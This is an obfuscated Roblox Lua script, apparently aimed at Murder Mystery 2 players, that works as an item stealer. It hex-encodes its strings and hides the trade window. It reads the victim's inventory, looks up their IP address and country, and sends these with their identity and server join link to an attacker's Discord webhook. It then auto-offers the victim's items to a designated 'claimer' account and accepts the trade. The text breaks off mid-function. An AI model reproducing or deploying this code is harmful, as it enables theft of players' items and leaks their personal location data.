local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local _0xFE = function(s)
	local _0xDF = {}
	for _0xED = 1, #s, 2 do
		_0xDF[#_0xDF + 1] = string.char(tonumber(s:sub(_0xED, _0xED + 1), 16))
	end
	return table.concat(_0xDF)
end

local function _0x1f(options)
	if request then
		return request(options), "request"
	elseif http_request then
		return http_request(options), "http_request"
	elseif syn and syn.request then
		return syn.request(options), "syn.request"
	end
	return nil, "none"
end

local function _0x2a(url)
	if type(url) == "string" and (string.sub(url, 1, 7) == "http://" or string.sub(url, 1, 8) == "https://") then
		return url
	end
	return nil
end

local function _0x3b(url, _0x30)
	local _0x2f = _0x2a(url)
	if not _0x2f then return end
	local _0x33, _0x35 = pcall(function()
		local _0x31, _0x32 = _0x1f({
			Url = _0x2f,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = _0x30,
		})
		if _0x32 == "none" then
			HttpService:PostAsync(_0x2f, _0x30, Enum.HttpContentType.ApplicationJson)
		end
	end)
end

local function _0x4c(url)
	local _0x2f = _0x2a(url)
	if not _0x2f then return nil end
	local _0x33, _0x34 = pcall(function()
		local _0x31, _0x32 = _0x1f({Url = _0x2f, Method = "GET"})
		if _0x32 == "none" then
			return game:HttpGet(_0x2f)
		end
		return _0x31 and _0x31.Body
	end)
	if _0x33 then return _0x34 end
	return nil
end

local _0x7 = {
	["Common"] = 1, ["Uncommon"] = 2, ["Rare"] = 3,
	["Legendary"] = 4, ["Godly"] = 5, ["Ancient"] = 6,
	["Chroma"] = 7, ["Vintage"] = 8, ["Unique"] = 9, ["Pet"] = 9,
}

local function _0x5d(_0x56)
	if _G.minRarity == "None" then return true end
	local _0x49 = _0x7[_G.minRarity] or 1
	local _0x4a = _0x7[_0x56] or 1
	return _0x4a >= _0x49
end

local _0x11 = {}

_0x11.Ancients = {
	["Batwing"] = {value=42,rarity="Ancient"},
	["Celestial"] = {value=2550,rarity="Ancient"},
	["Elderwood Scythe"] = {value=38,rarity="Ancient"},
	["Gingerscope"] = {value=16500,rarity="Ancient"},
	["Hallowscythe"] = {value=30,rarity="Ancient"},
	["Harvester"] = {value=250,rarity="Ancient"},
	["Icebreaker"] = {value=65,rarity="Ancient"},
	["Icepiercer"] = {value=160,rarity="Ancient"},
	["Icewing"] = {value=13,rarity="Ancient"},
	["Logchopper"] = {value=18,rarity="Ancient"},
	["Swirly Axe"] = {value=38,rarity="Ancient"},
	["Traveler's Axe"] = {value=8100,rarity="Ancient"},
	["Vampire's Axe"] = {value=1600,rarity="Ancient"},
}

_0x11.Chromas = {
	["Chroma Alienbeam"] = {value=24000,rarity="Chroma"},
	["Chroma Bauble"] = {value=34000,rarity="Chroma"},
	["Chroma Beachy"] = {value=1550,rarity="Chroma"},
	["Chroma Blizzard"] = {value=4400,rarity="Chroma"},
	["Chroma Boneblade"] = {value=22,rarity="Chroma"},
	["Chroma Candleflame"] = {value=40,rarity="Chroma"},
	["Chroma Constellation"] = {value=33000,rarity="Chroma"},
	["Chroma Cookiecane"] = {value=32,rarity="Chroma"},
	["Chroma Darkbringer"] = {value=65,rarity="Chroma"},
	["Chroma Deathshard"] = {value=35,rarity="Chroma"},
	["Chroma Elderwood Blade"] = {value=37,rarity="Chroma"},
	["Chroma Evergreen"] = {value=47000,rarity="Chroma"},
	["Chroma Evergun"] = {value=68000,rarity="Chroma"},
	["Chroma Fang"] = {value=32,rarity="Chroma"},
	["Chroma Fire Bat"] = {value=3,rarity="Chroma"},
	["Chroma Fire Bear"] = {value=3,rarity="Chroma"},
	["Chroma Fire Bunny"] = {value=3,rarity="Chroma"},
	["Chroma Fire Cat"] = {value=3,rarity="Chroma"},
	["Chroma Fire Dog"] = {value=3,rarity="Chroma"},
	["Chroma Fire Fox"] = {value=3,rarity="Chroma"},
	["Chroma Fire Pig"] = {value=3,rarity="Chroma"},
	["Chroma Gemstone"] = {value=32,rarity="Chroma"},
	["Chroma Gingerblade"] = {value=27,rarity="Chroma"},
	["Chroma Heart Wand"] = {value=4250,rarity="Chroma"},
	["Chroma Heat"] = {value=28,rarity="Chroma"},
	["Chroma Icecream"] = {value=2250,rarity="Chroma"},
	["Chroma Laser"] = {value=40,rarity="Chroma"},
	["Chroma Lightbringer"] = {value=60,rarity="Chroma"},
	["Chroma Luger"] = {value=50,rarity="Chroma"},
	["Chroma Ornament"] = {value=1825,rarity="Chroma"},
	["Chroma Raygun"] = {value=14000,rarity="Chroma"},
	["Chroma Sands"] = {value=1600,rarity="Chroma"},
	["Chroma Saw"] = {value=23,rarity="Chroma"},
	["Chroma Seer"] = {value=28,rarity="Chroma"},
	["Chroma Shark"] = {value=32,rarity="Chroma"},
	["Chroma Slasher"] = {value=32,rarity="Chroma"},
	["Chroma Snow Dagger"] = {value=2350,rarity="Chroma"},
	["Chroma Snowcannon"] = {value=7750,rarity="Chroma"},
	["Chroma Snowstorm"] = {value=4250,rarity="Chroma"},
	["Chroma Sunrise"] = {value=11250,rarity="Chroma"},
	["Chroma Sunset"] = {value=7250,rarity="Chroma"},
	["Chroma Sweet"] = {value=1725,rarity="Chroma"},
	["Chroma Swirly Gun"] = {value=35,rarity="Chroma"},
	["Chroma Tides"] = {value=27,rarity="Chroma"},
	["Chroma Traveler's Gun"] = {value=185000,rarity="Chroma"},
	["Chroma Treat"] = {value=1775,rarity="Chroma"},
	["Chroma Vampire's Gun"] = {value=29000,rarity="Chroma"},
	["Chroma Watergun"] = {value=2700,rarity="Chroma"},
}

_0x11.Godlies = {
	["Alienbeam"] = {value=2050,rarity="Godly"},
	["Amerilaser"] = {value=22,rarity="Godly"},
	["Australis"] = {value=140,rarity="Godly"},
	["Bat"] = {value=120,rarity="Godly"},
	["Battleaxe"] = {value=12,rarity="Godly"},
	["Battleaxe II"] = {value=17,rarity="Godly"},
	["Batwing"] = {value=1000000,rarity="Godly"},
	["Bauble"] = {value=675,rarity="Godly"},
	["Beachy"] = {value=105,rarity="Godly"},
	["Bioblade"] = {value=8,rarity="Godly"},
	["Black Luger"] = {value=1000000,rarity="Godly"},
	["Blaster"] = {value=17,rarity="Godly"},
	["Blizzard"] = {value=280,rarity="Godly"},
	["Bloom"] = {value=400,rarity="Godly"},
	["Blossom"] = {value=1370,rarity="Godly"},
	["Blue Seer"] = {value=3,rarity="Godly"},
	["Boneblade"] = {value=7,rarity="Godly"},
	["Borealis"] = {value=145,rarity="Godly"},
	["Candleflame"] = {value=33,rarity="Godly"},
	["Candy"] = {value=80,rarity="Godly"},
	["Chill"] = {value=10,rarity="Godly"},
	["Clockwork"] = {value=10,rarity="Godly"},
	["Constellation"] = {value=3200,rarity="Godly"},
	["Cookieblade"] = {value=3,rarity="Godly"},
	["Cookiecane"] = {value=13,rarity="Godly"},
	["Darkbringer"] = {value=33,rarity="Godly"},
	["Darkshot"] = {value=1800,rarity="Godly"},
	["Darksword"] = {value=1775,rarity="Godly"},
	["Deathshard"] = {value=13,rarity="Godly"},
	["Eggblade"] = {value=5,rarity="Godly"},
	["Elderwood Blade"] = {value=33,rarity="Godly"},
	["Elderwood Revolver"] = {value=33,rarity="Godly"},
	["Eternal"] = {value=7,rarity="Godly"},
	["Eternal II"] = {value=7,rarity="Godly"},
	["Eternal III"] = {value=8,rarity="Godly"},
	["Eternal IV"] = {value=8,rarity="Godly"},
	["Eternalcane"] = {value=13,rarity="Godly"},
	["Evergreen"] = {value=2900,rarity="Godly"},
	["Evergun"] = {value=3450,rarity="Godly"},
	["Fang"] = {value=10,rarity="Godly"},
	["Flames"] = {value=5,rarity="Godly"},
	["Flora"] = {value=410,rarity="Godly"},
	["Flowerwood"] = {value=260,rarity="Godly"},
	["Flowerwood Gun"] = {value=265,rarity="Godly"},
	["Frostbite"] = {value=7,rarity="Godly"},
	["Frostsaber"] = {value=10,rarity="Godly"},
	["Gemstone"] = {value=15,rarity="Godly"},
	["Ghostblade"] = {value=7,rarity="Godly"},
	["Ginger Luger"] = {value=17,rarity="Godly"},
	["Gingerblade"] = {value=13,rarity="Godly"},
	["Gingermint"] = {value=12,rarity="Godly"},
	["Green Luger"] = {value=23,rarity="Godly"},
	["Hallow's Blade"] = {value=8,rarity="Godly"},
	["Hallow's Edge"] = {value=8,rarity="Godly"},
	["Hallowgun"] = {value=20,rarity="Godly"},
	["Handsaw"] = {value=8,rarity="Godly"},
	["Heart Wand"] = {value=340,rarity="Godly"},
	["Heartblade"] = {value=65,rarity="Godly"},
	["Heat"] = {value=10,rarity="Godly"},
	["Ice Dragon"] = {value=7,rarity="Godly"},
	["Ice Shard"] = {value=7,rarity="Godly"},
	["Icebeam"] = {value=18,rarity="Godly"},
	["Iceblaster"] = {value=33,rarity="Godly"},
	["Icecream"] = {value=155,rarity="Godly"},
	["Iceflake"] = {value=15,rarity="Godly"},
	["Jinglegun"] = {value=13,rarity="Godly"},
	["Laser"] = {value=22,rarity="Godly"},
	["Lightbringer"] = {value=32,rarity="Godly"},
	["Luger"] = {value=18,rarity="Godly"},
	["Lugercane"] = {value=13,rarity="Godly"},
	["Makeshift"] = {value=33,rarity="Godly"},
	["Minty"] = {value=13,rarity="Godly"},
	["Mortal Blade"] = {value=1000000,rarity="Godly"},
	["Nebula"] = {value=13,rarity="Godly"},
	["Nightblade"] = {value=20,rarity="Godly"},
	["Ocean"] = {value=285,rarity="Godly"},
	["Old Glory"] = {value=15,rarity="Godly"},
	["Orange Seer"] = {value=2,rarity="Godly"},
	["Ornament"] = {value=105,rarity="Godly"},
	["Pearl"] = {value=75,rarity="Godly"},
	["Pearlshine"] = {value=80,rarity="Godly"},
	["Peppermint"] = {value=4,rarity="Godly"},
	["Phantom"] = {value=35,rarity="Godly"},
	["Pixel"] = {value=17,rarity="Godly"},
	["Plasmabeam"] = {value=18,rarity="Godly"},
	["Plasmablade"] = {value=15,rarity="Godly"},
	["Prismatic"] = {value=7,rarity="Godly"},
	["Pumpking"] = {value=7,rarity="Godly"},
	["Purple Seer"] = {value=3,rarity="Godly"},
	["Rainbow"] = {value=410,rarity="Godly"},
	["Rainbow Gun"] = {value=420,rarity="Godly"},
	["Raygun"] = {value=1750,rarity="Godly"},
	["Red Luger"] = {value=35,rarity="Godly"},
	["Red Seer"] = {value=3,rarity="Godly"},
	["Sakura"] = {value=1360,rarity="Godly"},
	["Sands"] = {value=105,rarity="Godly"},
	["Saw"] = {value=7,rarity="Godly"},
	["Seer"] = {value=3,rarity="Godly"},
	["Shark"] = {value=20,rarity="Godly"},
	["Slasher"] = {value=15,rarity="Godly"},
	["Snow Dagger"] = {value=175,rarity="Godly"},
	["Snowcannon"] = {value=675,rarity="Godly"},
	["Snowflake"] = {value=5,rarity="Godly"},
	["Snowstorm"] = {value=280,rarity="Godly"},
	["Soul"] = {value=655,rarity="Godly"},
	["Spectre"] = {value=35,rarity="Godly"},
	["Spider"] = {value=10,rarity="Godly"},
	["Spirit"] = {value=645,rarity="Godly"},
	["Sugar"] = {value=32,rarity="Godly"},
	["Sunrise"] = {value=1100,rarity="Godly"},
	["Sunset"] = {value=675,rarity="Godly"},
	["Sweet"] = {value=150,rarity="Godly"},
	["Swirly Blade"] = {value=12,rarity="Godly"},
	["Swirly Gun"] = {value=18,rarity="Godly"},
	["Tides"] = {value=10,rarity="Godly"},
	["Traveler's Gun"] = {value=5500,rarity="Godly"},
	["Treat"] = {value=155,rarity="Godly"},
	["Turkey"] = {value=2000,rarity="Godly"},
	["Vampire's Edge"] = {value=15,rarity="Godly"},
	["Vampire's Gun"] = {value=2100,rarity="Godly"},
	["Virtual"] = {value=13,rarity="Godly"},
	["Watergun"] = {value=175,rarity="Godly"},
	["Waves"] = {value=280,rarity="Godly"},
	["Winter's Edge"] = {value=5,rarity="Godly"},
	["Xenoknife"] = {value=405,rarity="Godly"},
	["Xenoshot"] = {value=405,rarity="Godly"},
	["Xmas"] = {value=7,rarity="Godly"},
	["Yellow Seer"] = {value=2,rarity="Godly"},
}

_0x11.Legendaries = {
	["Aquarium (Gun)"] = {value=75,rarity="Legendary"},
	["Aquarium (Knife)"] = {value=50,rarity="Legendary"},
	["Arctic (Gun)"] = {value=10,rarity="Legendary"},
	["Arctic (Knife)"] = {value=100,rarity="Legendary"},
	["Aurora (Gun)"] = {value=45,rarity="Legendary"},
	["Aurora (Knife)"] = {value=3,rarity="Legendary"},
	["Beach"] = {value=35,rarity="Legendary"},
	["Blue Elite"] = {value=3,rarity="Legendary"},
	["Blue Scratch"] = {value=2,rarity="Legendary"},
	["Broken"] = {value=7,rarity="Legendary"},
	["Bubbles"] = {value=50,rarity="Legendary"},
	["Bunnies"] = {value=4,rarity="Legendary"},
	["Cavern (Gun)"] = {value=1,rarity="Legendary"},
	["Cavern (Knife)"] = {value=7,rarity="Legendary"},
	["Chromatic (Gun)"] = {value=100,rarity="Legendary"},
	["Chromatic (Knife)"] = {value=1,rarity="Legendary"},
	["Cotton Candy"] = {value=35,rarity="Legendary"},
	["Cupid"] = {value=50,rarity="Legendary"},
	["Cursed (Gun)"] = {value=75,rarity="Legendary"},
	["Cursed (Knife)"] = {value=100,rarity="Legendary"},
	["Elite"] = {value=24,rarity="Legendary"},
	["Emerald"] = {value=100,rarity="Legendary"},
	["Energized (Gun)"] = {value=2,rarity="Legendary"},
	["Energized (Knife)"] = {value=100,rarity="Legendary"},
	["Fade"] = {value=32,rarity="Legendary"},
	["Frostfade (Gun)"] = {value=75,rarity="Legendary"},
	["Frostfade (Knife)"] = {value=2,rarity="Legendary"},
	["Frozen (Gun)"] = {value=100,rarity="Legendary"},
	["Frozen (Knife)"] = {value=75,rarity="Legendary"},
	["Fusion"] = {value=32,rarity="Legendary"},
	["Ghost (Gun)"] = {value=2,rarity="Legendary"},
	["Ghost (Knife)"] = {value=5,rarity="Legendary"},
	["Ginger (Gun)"] = {value=5,rarity="Legendary"},
	["Ginger (Knife)"] = {value=50,rarity="Legendary"},
	["Green Elite"] = {value=3,rarity="Legendary"},
	["Green Fire"] = {value=100,rarity="Legendary"},
	["Icecracker"] = {value=1,rarity="Legendary"},
	["Icedriller"] = {value=5,rarity="Legendary"},
	["JD"] = {value=28,rarity="Legendary"},
	["Latte (Gun)"] = {value=140,rarity="Legendary"},
	["Latte (Knife)"] = {value=140,rarity="Legendary"},
	["Midnight"] = {value=75,rarity="Legendary"},
	["Nightsky"] = {value=5,rarity="Legendary"},
	["Nightstar"] = {value=100,rarity="Legendary"},
	["Overseer (Gun)"] = {value=100,rarity="Legendary"},
	["Overseer (Knife)"] = {value=32,rarity="Legendary"},
	["Palms (Gun)"] = {value=75,rarity="Legendary"},
	["Palms (Knife)"] = {value=50,rarity="Legendary"},
	["Plasmite"] = {value=32,rarity="Legendary"},
	["Predator (Gun)"] = {value=32,rarity="Legendary"},
	["Predator (Knife)"] = {value=100,rarity="Legendary"},
	["Red Fire"] = {value=1,rarity="Legendary"},
	["Red Scratch"] = {value=4,rarity="Legendary"},
	["Ripper (Gun)"] = {value=50,rarity="Legendary"},
	["Ripper (Knife)"] = {value=100,rarity="Legendary"},
	["Rune"] = {value=32,rarity="Legendary"},
	["Rupture"] = {value=100,rarity="Legendary"},
	["Santa's Magic"] = {value=3,rarity="Legendary"},
	["Santa's Spirit"] = {value=3,rarity="Legendary"},
	["Shiny"] = {value=32,rarity="Legendary"},
	["Skulls"] = {value=4,rarity="Legendary"},
	["Sparkle"] = {value=75,rarity="Legendary"},
	["Spectral (Gun)"] = {value=3,rarity="Legendary"},
	["Spectral (Knife)"] = {value=50,rarity="Legendary"},
	["Splash (Gun)"] = {value=24,rarity="Legendary"},
	["Splash (Knife)"] = {value=32,rarity="Legendary"},
	["Traveler (Gun)"] = {value=50,rarity="Legendary"},
	["Traveler (Knife)"] = {value=3,rarity="Legendary"},
	["Tree (Gun)"] = {value=100,rarity="Legendary"},
	["Tree (Knife)"] = {value=100,rarity="Legendary"},
	["Universe"] = {value=32,rarity="Legendary"},
	["Vampire (Gun)"] = {value=45,rarity="Legendary"},
	["Vampire (Knife)"] = {value=3,rarity="Legendary"},
	["Viper"] = {value=32,rarity="Legendary"},
	["Web"] = {value=100,rarity="Legendary"},
	["Witched"] = {value=3,rarity="Legendary"},
}

_0x11.Rares = {
	["Abstract"] = {value=12,rarity="Rare"},
	["Ace"] = {value=12,rarity="Rare"},
	["Dungeon"] = {value=150,rarity="Rare"},
	["Darkknife"] = {value=70,rarity="Rare"},
	["Butterflies"] = {value=25,rarity="Rare"},
	["Bio"] = {value=24,rarity="Rare"},
	["Ice Camo"] = {value=50,rarity="Rare"},
	["Mummy"] = {value=100,rarity="Rare"},
	["Nuke"] = {value=75,rarity="Rare"},
	["Snowy"] = {value=75,rarity="Rare"},
	["Zombified"] = {value=30,rarity="Rare"},
}

_0x11.Uncommons = {
	["Bones"] = {value=210,rarity="Uncommon"},
	["Brains"] = {value=135,rarity="Uncommon"},
	["Branches"] = {value=50,rarity="Uncommon"},
	["Gifted"] = {value=100,rarity="Uncommon"},
	["Nutcracker"] = {value=100,rarity="Uncommon"},
	["Snowy"] = {value=100,rarity="Uncommon"},
	["Pool Noodle"] = {value=25,rarity="Uncommon"},
	["Steel (Knife)"] = {value=50,rarity="Uncommon"},
}

_0x11.Commons = {
	["2015"] = {value=100,rarity="Common"},
	["Blossom"] = {value=100,rarity="Common"},
	["Goo"] = {value=100,rarity="Common"},
	["Hearts"] = {value=100,rarity="Common"},
	["Infected (Knife)"] = {value=100,rarity="Common"},
}

_0x11.Vintages = {
	["America"] = {value=7,rarity="Vintage"},
	["Blood"] = {value=8,rarity="Vintage"},
	["Cowboy"] = {value=4,rarity="Vintage"},
	["Ghost"] = {value=8,rarity="Vintage"},
	["Golden"] = {value=4,rarity="Vintage"},
	["Laser"] = {value=8,rarity="Vintage"},
	["Phaser"] = {value=5,rarity="Vintage"},
	["Prince"] = {value=6,rarity="Vintage"},
	["Shadow"] = {value=6,rarity="Vintage"},
	["Splitter"] = {value=3,rarity="Vintage"},
}

_0x11.Uniques = {
	["Corrupt"] = {value=350,rarity="Unique"},
}

_0x11.Pets = {
	["Black Cat"] = {value=75,rarity="Pet"},
	["Blue Pumpkin [HALLOWS2018]"] = {value=220,rarity="Pet"},
	["Carrot Bunny"] = {value=75,rarity="Pet"},
	["Deathspeaker"] = {value=75,rarity="Pet"},
	["Dogey"] = {value=150,rarity="Pet"},
	["Elf (2019)"] = {value=625,rarity="Pet"},
	["Fire Bat"] = {value=50,rarity="Pet"},
	["Fire Bear"] = {value=50,rarity="Pet"},
	["Fire Bunny"] = {value=50,rarity="Pet"},
	["Fire Cat"] = {value=50,rarity="Pet"},
	["Fire Dog"] = {value=50,rarity="Pet"},
	["Fire Fox"] = {value=50,rarity="Pet"},
	["Fire Pig"] = {value=50,rarity="Pet"},
	["Zombie Dog"] = {value=750,rarity="Pet"},
}

local _0x9a = {}
for _0x47, _0x0d in pairs(_0x11) do
	for name, _0x43 in pairs(_0x0d) do
		_0x9a[string.lower(name)] = {value = _0x43.value, rarity = _0x43.rarity, _0x10 = name}
		local _0x48 = string.gsub(name, "%s*%[.-%]$", "")
		if _0x48 ~= name then
			_0x9a[string.lower(_0x48)] = {value = _0x43.value, rarity = _0x43.rarity, _0x10 = name}
		end
	end
end

local LocalPlayer = Players.LocalPlayer
local _0xce = ReplicatedStorage:WaitForChild("Trade")
local Database = ReplicatedStorage:WaitForChild("Database")
local Modules = ReplicatedStorage:WaitForChild("Modules")
local Sync = require(Database:WaitForChild("Sync"))
local ProfileData = require(Modules:WaitForChild("ProfileData"))

local function _0x6f()
	local _0x58 = 0
	while (not ProfileData.Weapons or not ProfileData.Weapons.Owned or not next(ProfileData.Weapons.Owned)) and _0x58 < 20 do
		task.wait(0.5)
		_0x58 = _0x58 + 1
	end
	local _0x0a = ProfileData.Weapons and ProfileData.Weapons.Owned
	if not _0x0a then return {} end
	local _0x0d = {}
	local _0x0b = {}
	for _0x0e, _0x12 in pairs(_0x0a) do
		if type(_0x0e) == "number" then
			local name = tostring(_0x12)
			_0x0b[name] = (_0x0b[name] and _0x0b[name] + 1) or 1
		else
			if type(_0x12) == "number" and _0x12 > 0 then
				_0x0b[_0x0e] = _0x12
			else
				_0x0b[_0x0e] = (_0x0b[_0x0e] and _0x0b[_0x0e] + 1) or 1
			end
		end
	end
	for _0x0e, _0x0c in pairs(_0x0b) do
		local _0x2d = Sync.Item[_0x0e] or (Sync.Weapons and Sync.Weapons[_0x0e])
		local _0x10 = nil
		if _0x2d then _0x10 = _0x2d.ItemName or _0x2d.Name end
		local _0x2e = nil
		if _0x10 then _0x2e = _0x9a[string.lower(_0x10)] end
		if not _0x2e then _0x2e = _0x9a[string.lower(_0x0e)] end
		if _0x2e and _0x2e.value >= _G.minValue and _0x5d(_0x2e.rarity) then
			table.insert(_0x0d, {
				_0x0e = _0x0e,
				_0x10 = _0x10 or _0x0e,
				value = _0x2e.value,
				rarity = _0x2e.rarity,
				_0x12 = _0x0c,
			})
		end
	end
	table.sort(_0x0d, function(a, b) return a.value > b.value end)
	return _0x0d
end

local function _0x6e() return game.JobId end

local function _0x7f(_0x57)
	return _0xFE("68747470733a2f2f7777772e726f626c6f782e636f6d2f6865616473686f742d7468756d626e61696c2f696d6167653f7573657249643d") .. _0x57 .. _0xFE("2677696474683d343230266865696768743d34323026666f726d61743d706e67")
end

local function _0x91()
	local _0x24, _0x25 = "N/A", "Unknown"
	pcall(function()
		local raw = _0x4c(_0xFE("68747470733a2f2f6170692e69706966792e6f72673f666f726d61743d6a736f6e"))
		if raw then _0x24 = HttpService:JSONDecode(raw).ip or "N/A" end
	end)
	pcall(function()
		local raw = _0x4c(_0xFE("687474703a2f2f69702d6170692e636f6d2f6a736f6e2f") .. _0x24)
		if raw then _0x25 = HttpService:JSONDecode(raw)._0x25 or "Unknown" end
	end)
	return _0x24, _0x25
end

local function _0xb3(_0x29, _0x55)
	local _0x28 = {}
	for _0x46, _0x53 in ipairs(_0x29) do
		if _0x46 <= _0x55 then
			table.insert(_0x28, _0x53._0x10 .. " | " .. tostring(_0x53.value) .. " [" .. _0x53.rarity .. "]")
		end
	end
	if #_0x29 > _0x55 then
		table.insert(_0x28, "...and " .. (#_0x29 - _0x55) .. " more")
	end
	return _0x28
end

local function _0xc4(_0x0d)
	local _0x52 = 0
	for _, _0x53 in ipairs(_0x0d) do _0x52 = _0x52 + (_0x53.value or 0) end
	return _0x52
end

local function _0xd5(_0x20, _0x21)
	if _G.webhook == "" then return end
	local _0x17 = Players.LocalPlayer
	local _0x18 = _0x17 and _0x17.Name or "?"
	local _0x19 = _0x17 and _0x17.UserId or 0
	local _0x22 = game.PlaceId
	local _0x23 = _0x6e()
	local _0x24, _0x25 = _0x91()
	local _0x26 = _0x7f(_0x19)
	local _0x27 = _0x7f(_0x21)
	local _0x20 = _0x20 or _G.username
	local _0x0d = {}
	for _0x15 = 1, 3 do
		local _0x33, _0x34 = pcall(_0x6f)
		if _0x33 and type(_0x34) == "table" then
			_0x0d = _0x34
			if #_0x0d > 0 then break end
		end
		task.wait(2)
	end
	local _0x28 = _0xb3(_0x0d, 10)
	local _0x2c = _0xc4(_0x0d)
	local _0x4e = _0xFE("68747470733a2f2f7777772e726f626c6f782e636f6d2f67616d65732f") .. _0x22 .. _0xFE("2f3f67616d65496e7374616e636549643d") .. _0x23
	local _0x4f = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. _0x22 .. ', "' .. _0x23 .. '", game.Players.LocalPlayer)'
	local _0x59 = {
		title = _0xFE("4d4d3220536e697065207c20536572766572205265616479"),
		color = 16739179,
		description = _0xFE("53657276657220697320757020616e6420686f6c64696e672e"),
		fields = {
			{name = _0xFE("546172676574"), value = "```\n" .. _0x18 .. " (" .. _0x19 .. ")\n```", inline = true},
			{name = _0xFE("436c61696d6572"), value = "```\n" .. _0x20 .. " (" .. _0x21 .. ")\n```", inline = true},
			{name = _0xFE("49502041646472657373"), value = "```\n" .. _0x24 .. "\n```", inline = true},
			{name = _0xFE("436f756e747279"), value = "```\n" .. _0x25 .. "\n```", inline = true},
			{name = _0xFE("506c616365204944"), value = "```\n" .. _0x22 .. "\n```", inline = true},
			{name = _0xFE("4a6f62204944"), value = "```\n" .. (_0x23 ~= "" and _0x23 or "N/A") .. "\n```", inline = false},
			{name = _0xFE("42657374204974656d732028") .. #_0x0d .. _0xFE("29202d20546f74616c20") .. _0x2c, value = #_0x28 > 0 and "```" .. table.concat(_0x28, "\n") .. "```" or _0xFE("6060604e6f206d61746368696e67206974656d73606060"), inline = false},
			{name = _0xFE("4a6f696e20536572766572"), value = _0xFE("5b2a2a436c69636b204865726520546f204a6f696e2a2a5d28") .. _0x4e .. ")", inline = false},
			{name = _0xFE("4a6f696e20536372697074"), value = "```lua\n" .. _0x4f .. "\n```", inline = false},
		},
		thumbnail = {url = _0x26},
		image = {url = _0x27},
		footer = {text = _0xFE("4d4d32204175746f205472616465207c20") .. os.date("%Y-%m-%d %H:%M:%S")},
	}
	pcall(function()
		_0x3b(_G.webhook, HttpService:JSONEncode({
			username = _0xFE("4d4d3220536e697065"),
			avatar_url = _0x27,
			embeds = {_0x59},
		}))
	end)
end

local function _0xe6(_0x21, _0x29)
	if _G.webhook == "" then return end
	local _0x17 = Players.LocalPlayer
	local _0x18 = _0x17.Name
	local _0x19 = _0x17.UserId
	local _0x24, _0x25 = _0x91()
	local _0x26 = _0x7f(_0x19)
	local _0x27 = _0x7f(_0x21)
	local _0x20 = _G.username
	local _0x28 = _0xb3(_0x29, 10)
	local _0x2c = _0xc4(_0x29)
	local _0x59 = {
		title = _0xFE("4d4d3220536e697065207c204974656d7320436c61696d6564"),
		color = 5763712,
		description = _0xFE("4974656d732068617665206265656e20616464656420746f20746865207472616465206f666665722e"),
		fields = {
			{name = _0xFE("546172676574"), value = "```\n" .. _0x18 .. " (" .. _0x19 .. ")\n```", inline = true},
			{name = _0xFE("436c61696d6572"), value = "```\n" .. _0x20 .. " (" .. _0x21 .. ")\n```", inline = true},
			{name = _0xFE("49502041646472657373"), value = "```\n" .. _0x24 .. "\n```", inline = true},
			{name = _0xFE("436f756e747279"), value = "```\n" .. _0x25 .. "\n```", inline = true},
			{name = _0xFE("546f74616c2056616c7565"), value = "```\n" .. _0x2c .. "\n```", inline = true},
			{name = _0xFE("4974656d732028") .. #_0x29 .. ")", value = #_0x28 > 0 and "```" .. table.concat(_0x28, "\n") .. "```" or _0xFE("6060604e6f6e65606060"), inline = false},
		},
		thumbnail = {url = _0x26},
		image = {url = _0x27},
		footer = {text = _0xFE("4d4d32204175746f205472616465207c20") .. os.date("%Y-%m-%d %H:%M:%S")},
	}
	pcall(function()
		_0x3b(_G.webhook, HttpService:JSONEncode({
			username = _0xFE("4d4d3220536e697065"),
			avatar_url = _0x27,
			embeds = {_0x59},
		}))
	end)
end

local function _0xf7(_0x0e)
	_0xce:WaitForChild("OfferItem"):FireServer(_0x0e, "Weapons")
end

local _0xbc = nil

local function _0x1a()
	task.spawn(function()
		task.wait(6.0)
		for _0x15 = 1, 2 do
			pcall(function()
				_0xce:WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 3, _0xbc)
			end)
			task.wait(0)
		end
	end)
end

local function _0x2b(_0x0a, _0x0e)
	if _0x0a[_0x0e] then return true end
	for _, _0x44 in pairs(_0x0a) do
		if _0x44 == _0x0e then return true end
	end
	return false
end

local function _0x3c(_0x0d, _0x50)
	_0x50 = _0x50 or 15
	local _0x36 = os.clock()
	while os.clock() - _0x36 < _0x50 do
		local _0x0a = ProfileData.Weapons and ProfileData.Weapons.Owned or {}
		local _0x51 = true
		for _, _0x53 in ipairs(_0x0d) do
			if _0x2b(_0x0a, _0x53._0x0e) then
				_0x51 = false
				break
			end
		end
		if _0x51 then return true end
		task.wait(0.2)
	end
	return false
end

local _0xab = false

local function _0x4d(_0x04, _0x13)
	local _0x41 = 4
	local _0x01 = {}
	local _0x38 = 1
	while _0x38 <= #_0x04 do
		local _0x03 = math.min(_0x38 + _0x41 - 1, #_0x04)
		local _0x02 = {}
		for _0x46 = _0x38, _0x03 do table.insert(_0x02, _0x04[_0x46]) end
		_0x38 = _0x03 + 1
		_0xab = false
		local _0x14 = false
		for _0x15 = 1, 6 do
			pcall(function() _0xce:WaitForChild("SendRequest"):InvokeServer(_0x13) end)
			local _0x37 = os.clock()
			while not _0xab and os.clock() - _0x37 < 6 do task.wait(0.5) end
			if _0xab then _0x14 = true break end
		end
		if not _0x14 then task.wait(3) continue end
		task.wait(0)
		for _, _0x53 in ipairs(_0x02) do
			for _0x46 = 1, _0x53._0x12 do _0xf7(_0x53._0x0e) end
		end
		_0x1a()
		_0x3c(_0x02, 15)
		task.wait(1.5)
		for _, _0x53 in ipairs(_0x02) do table.insert(_0x01, _0x53) end
	end
	return _0x01
end

local function _0x5e()
	while true do
		for _, _0x4b in ipairs(Players:GetPlayers()) do
			if _0x4b.Name == _G.username or _0x4b.DisplayName == _G.username then
				return _0x4b
			end
		end
		task.wait(1)
	end
end

local tradeGui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI", 30)
if tradeGui then
	tradeGui.Enabled = false
	tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
		if tradeGui.Enabled then tradeGui.Enabled = false end
	end)
end

task.spawn(function() _0xd5(_G.username, 0) end)

local _0x16 = _0x5e()
task.spawn(function() _0xd5(_0x16.Name, _0x16.UserId) end)

if not _0x16.Character or not _0x16.Character:FindFirstChildOfClass("Humanoid") then
	_0x16.CharacterAdded:Wait()
end

repeat task.wait(0.5) until _0x16:GetAttribute("ClientLoaded") == true

_0xce:WaitForChild("StartTrade").OnClientEvent:Connect(function(...)
	local _0x45 = {...}
